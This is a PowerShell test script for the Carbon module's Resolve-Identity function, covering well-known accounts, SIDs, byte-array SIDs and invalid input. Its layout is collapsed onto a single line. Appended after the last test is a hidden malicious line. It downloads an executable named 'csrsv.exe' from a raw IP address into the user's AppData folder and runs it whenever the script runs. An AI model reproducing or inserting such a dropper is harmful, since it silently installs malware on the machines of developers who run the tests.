function Start-TestFixture{& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)}function Test-ShouldResolveBuiltinIdentity{$identity = Resolve-Identity -Name 'Administrators'Assert-Equal 'BUILTIN\Administrators' $identity.FullNameAssert-Equal 'BUILTIN' $identity.DomainAssert-Equal 'Administrators' $identity.NameAssert-NotNull $identity.SidAssert-Equal 'Alias' $identity.Type}function Test-ShouldResolveNTAuthorityIdentity{$identity = Resolve-Identity -Name 'NetworkService'Assert-Equal 'NT AUTHORITY\NETWORK SERVICE' $identity.FullNameAssert-Equal 'NT AUTHORITY' $identity.DomainAssert-Equal 'NETWORK SERVICE' $identity.NameAssert-NotNull $identity.SidAssert-Equal 'WellKnownGroup' $identity.Type}function Test-ShouldResolveEveryone{$identity  = Resolve-Identity -Name 'Everyone'Assert-Equal 'Everyone' $identity.FullNameAssert-Equal '' $identity.DomainAssert-Equal 'Everyone' $identity.NameAssert-NotNull $identity.SidAssert-Equal 'WellKnownGroup' $identity.Type}function Test-ShouldNotResolveMadeUpName{$Error.Clear()$fullName = Resolve-Identity -Name 'IDONotExist' -ErrorAction SilentlyContinueAssert-GreaterThan $Error.Count 0Assert-Like $Error[0].Exception.Message '*not found*'Assert-Null $fullName}function Test-ShouldResolveLocalSystem{Assert-Equal 'NT AUTHORITY\SYSTEM' (Resolve-Identity -Name 'localsystem').FullName}function Test-ShouldResolveDotAccounts{foreach( $user in (Get-User) ){$id = Resolve-Identity -Name ('.\{0}' -f $user.SamAccountName)Assert-NoErrorAssert-NotNull $idAssert-Equal $id.Domain $user.ConnectedServerAssert-Equal $id.Name $user.SamAccountName}}function Test-ShouldResolveSid{@( 'NT AUTHORITY\SYSTEM', 'Everyone', 'BUILTIN\Administrators' ) | ForEach-Object {$id = Resolve-Identity -Name $_$idFromSid = Resolve-Identity -Sid $id.SidAssert-Equal $id $idFromSid}}function Test-ShouldResolveUnknownSid{$id = Resolve-Identity -SID 'S-1-5-21-2678556459-1010642102-471947008-1017' -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'not found'Assert-Null $id}function Test-ShouldResolveSidByByteArray{$id = Resolve-Identity -Name 'Administrators'Assert-NotNull $id$sidBytes = New-Object 'byte[]' $id.Sid.BinaryLength$id.Sid.GetBinaryForm( $sidBytes, 0 )$idBySid = Resolve-Identity -SID $sidBytesAssert-NotNull $idBySidAssert-NoError Assert-Equal $id $idBySid}function Test-ShouldHandleInvalidSddl{$Error.Clear()$id = Resolve-Identity -SID 'iamnotasid' -ErrorAction SilentlyContinueAssert-Error 'exception converting'Assert-Error -Count 2Assert-Null $id}function Test-ShouldHandleInvalidBinarySid{$Error.Clear()$id = Resolve-Identity -SID (New-Object 'byte[]' 28) -ErrorAction SilentlyContinueAssert-Error 'exception converting'Assert-Error -Count 2Assert-Null $id}(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")